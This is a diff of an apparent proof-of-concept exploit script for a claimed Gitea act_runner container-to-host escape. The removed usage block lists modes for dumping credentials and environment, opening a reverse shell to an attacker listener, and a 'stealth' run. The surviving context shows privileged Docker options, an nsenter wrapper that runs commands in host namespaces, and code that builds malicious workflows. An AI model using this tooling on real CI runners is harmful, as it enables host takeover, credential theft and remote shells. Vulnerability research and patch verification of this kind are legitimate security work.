@@ -8,22 +8,6 @@ Credit:   sn0x-sharma
 
 Advisory: https://github.com/go-gitea/gitea/security/advisories/GHSA-x4q3-gcj3-m6cf
 
-USAGE
------
-  # Basic marker proof
-  python3 gitea_act_runner_escape.py
-
-  # Credential + env dump
-  python3 gitea_act_runner_escape.py --mode creds
-
-  # Reverse shell (listener must be running)
-  python3 gitea_act_runner_escape.py --mode revshell --lhost 10.10.10.1 --lport 4444
-
-  # Full stealth run, JSON report saved
-  python3 gitea_act_runner_escape.py --mode full --stealth --report /tmp/report.json
-
-  # Check only: is this runner version vulnerable?
-  python3 gitea_act_runner_escape.py --check-only
 """
 
 import argparse
@@ -40,10 +24,6 @@ import tempfile
 import textwrap
 import time
 from datetime import datetime, timezone
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Constants
-# ──────────────────────────────────────────────────────────────────────────────
 
 DANGEROUS_OPTIONS = (
     "--pid=host --ipc=host --cap-add=ALL "
@@ -68,11 +48,6 @@ BANNER = r"""
   GHSA-x4q3-gcj3-m6cf  |  CVSS 9.9 Critical
   Credit: sn0x-sharma  |  Fixed in runner > 3.0.0
 """
-
-# ──────────────────────────────────────────────────────────────────────────────
-# CLI
-# ──────────────────────────────────────────────────────────────────────────────
-
 def build_parser():
     p = argparse.ArgumentParser(
         description="CVE-2026-73802 — Gitea act_runner host namespace escape PoC",
@@ -108,11 +83,6 @@ def build_parser():
 
     return p
 
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Version detection
-# ──────────────────────────────────────────────────────────────────────────────
-
 def get_runner_version(runner_bin: str) -> tuple:
     """Return (major, minor, patch) or (0,0,0) on failure."""
     try:
@@ -138,11 +108,6 @@ def check_vulnerability(runner_bin: str) -> dict:
         "vulnerable": vulnerable,
         "status": "VULNERABLE" if vulnerable else "PATCHED",
     }
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Payload builders
-# ──────────────────────────────────────────────────────────────────────────────
 
 def _nsenter(cmd: str) -> str:
     """Wrap a shell command in nsenter to run in host PID 1 namespaces."""
@@ -225,12 +190,7 @@ def select_payload(mode: str, marker: str, lhost: str, lport: int) -> str:
     if mode == "full":
         return payload_full(marker, lhost, lport)
     return payload_marker(marker)
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Workflow generation
-# ──────────────────────────────────────────────────────────────────────────────
-
+  
 def write_workflow(root: pathlib.Path, run_cmd: str, image: str) -> pathlib.Path:
     workflows = root / ".gitea" / "workflows"
     workflows.mkdir(parents=True, exist_ok=True)
@@ -257,11 +217,6 @@ jobs:
     path.write_text(workflow, encoding="utf-8")
     return path
 
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Runner execution
-# ──────────────────────────────────────────────────────────────────────────────
-
 def run_runner(args, root: pathlib.Path):
     cmd = [
         args.runner, "exec",
@@ -284,11 +239,6 @@ def run_runner(args, root: pathlib.Path):
         timeout=args.timeout,
         check=False,
     )
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Helpers
-# ──────────────────────────────────────────────────────────────────────────────
 
 def validate_marker(marker: str):
     if not marker.startswith("/"):
@@ -324,11 +274,6 @@ def check_docker():
     else:
         print("[+] Docker socket present", flush=True)
 
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Report
-# ──────────────────────────────────────────────────────────────────────────────
-
 def build_report(ver_info: dict, mode: str, success: bool, marker_content: str, elapsed: float) -> dict:
     return {
         "cve": "CVE-2026-73802",
@@ -351,11 +296,6 @@ def save_report(report: dict, path: str):
         json.dumps(report, indent=2), encoding="utf-8"
     )
     print(f"[+] report saved → {path}", flush=True)
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# Main
-# ──────────────────────────────────────────────────────────────────────────────
 
 def main():
     print(BANNER, flush=True)
